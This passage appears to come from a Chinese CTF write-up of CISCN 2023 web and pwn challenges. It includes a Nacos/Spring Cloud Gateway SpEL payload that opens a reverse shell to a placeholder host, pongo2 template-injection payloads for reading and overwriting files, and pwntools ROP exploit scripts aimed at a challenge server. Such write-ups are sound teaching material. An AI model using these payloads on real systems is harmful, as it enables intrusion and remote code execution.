class="hljs-variable">$black</span>[<span class="hljs-variable">$i</span>])===<span class="hljs-literal">FALSE</span>))&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;host&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;-h&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=ctf&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$db</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no db!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from <span class="hljs-subst">$db</span>.<span class="hljs-subst">$t2q</span>&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2q</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-variable">$stm</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stm</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2d</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2d</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$randstr</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>());<br>    <span class="hljs-variable">$dump</span>=<span class="hljs-string">&#x27;mariadb-dump &#x27;</span>.<span class="hljs-variable">$db</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$t2d</span>.<span class="hljs-string">&#x27; &gt;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$dump</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;dump log here: &lt;a href=\&#x27;&#x27;</span>.<span class="hljs-string">&#x27;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>.<span class="hljs-string">&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>nacos服务，CVE-2021-29441添加任意用户进后台</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-1.png"></p><p>分析<code>backend-1.0-SNAPSHOT.jar</code></p><p>发现内部配置服务有个8888的gateway服务，id为backcfg</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">backcfg</span><br>        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">json</span><br>        <span class="hljs-attr">group:</span> <span class="hljs-string">DEFAULT_GROUP</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br></code></pre></td></tr></table></figure><p>可以通过修改Gateway配置文件反代backendservice服务实现rce</p><p>参考文章：<a href="https://xz.aliyun.com/t/11493#toc">https://xz.aliyun.com/t/11493#toc</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-2.png"></p><p>反弹shell</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;spring&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;cloud&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;gateway&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;routes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exam&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;order&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;lb://backendservice&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;predicates:&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-string">&quot;Path=/evil/**&quot;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;replacement&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/xxxx/xxxx 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-3.png"></p><h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/flosch/pongo2/v6&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br><span class="hljs-string">&quot;html&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>err = session.Save(c.Request, c.Writer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, guest&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>name := c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;ssti&quot;</span>)<br>xssWaf := html.EscapeString(name)<br>tpl, err := pongo2.FromString(<span class="hljs-string">&quot;Hello &quot;</span> + xssWaf + <span class="hljs-string">&quot;!&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>out, err := tpl.Execute(pongo2.Context&#123;<span class="hljs-string">&quot;c&quot;</span>: c&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;guest&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body, _ := io.ReadAll(resp.Body)<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><p>有三个路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, route.Admin)<br>r.GET(<span class="hljs-string">&quot;/flask&quot;</span>, route.Flask)<br></code></pre></td></tr></table></figure><p><code>Index</code>路由提供了一个默认的session，name赋值为guest<br><code>Admin</code>路由判断session，需要name值为admin，并使用EscapeString转义name，而且还使用了pongo2渲染，存在ssti漏洞<br><code>Flask</code>路由访问内部5000端口的flask服务并回显页面</p><p>因为<code>SESSION_KEY</code>是从环境变量获取的，猜测为空，进行<code>session</code>伪造<br>本地修改<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code>，运行拿到伪造的<code>session</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-1.png"></p><p>访问<code>/flask?name=/</code>通过报错拿到<code>flask</code>源码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-3.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args[<span class="hljs-string">&#x27;name&#x27;</span>]<br>    <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;no ssti&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>可以看到<code>flask</code>开启了<code>debug</code>模式，<code>debug</code>攻击点一般在<code>算pin</code>或<code>debug热加载</code><br>但是访问<code>/console</code>实现rce需要携带cookie验证，因为我们无法传递cookie，所以利用ssti读文件算pin后rce这条路走不通</p><p>如图，当flask文件的内容被更改后，flask会自动更新，也就是热加载</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-2.png"></p><p>所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容</p><p>查阅<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">官方手册</a>可知pongo2与Django 1.7有兼容的语法和功能集</p><p>Django中的include语法在pongo2中也能使用，所以可以用include实现任意文件读取<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-6.png"></p><p>写文件可以⽤Gin Context里的FormFile来读取表单⽂件，用SaveUploadFile上传，注意需要用GET传参</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-8.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-7.png"></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//读文件</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//写文件</span><br><span class="hljs-comment">//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-4.png"></p><p>覆盖后就可以执行我们自定义的内容了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-5.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h2><p>修改名称存在栈溢出，程序不存在<code>system</code>函数，使用<code>orw</code>获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./shaokao&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.251.120&quot;</span>,<span class="hljs-string">&quot;12585&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>fopen=e.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read=e.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=e.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401fae&#x27;)</span><br>rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#rdi</span><br>rsi=<span class="hljs-number">0x000000000040a67e</span> <span class="hljs-comment">#rsi</span><br>rdx=<span class="hljs-number">0x00000000004a404b</span> <span class="hljs-comment">#rdx rbx</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-100000&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(fopen)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(read)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>p.sendline(payload)<br></code></pre></td></tr></table></figure><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>程序使用了<code>protobuf</code>协议解析输入数据，构造<code>protobuf</code>数据，传入即可<br>程序中存在<code>uaf</code>漏洞与数组越界漏洞，利用<code>gadget</code>构造栈迁移，实现<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>  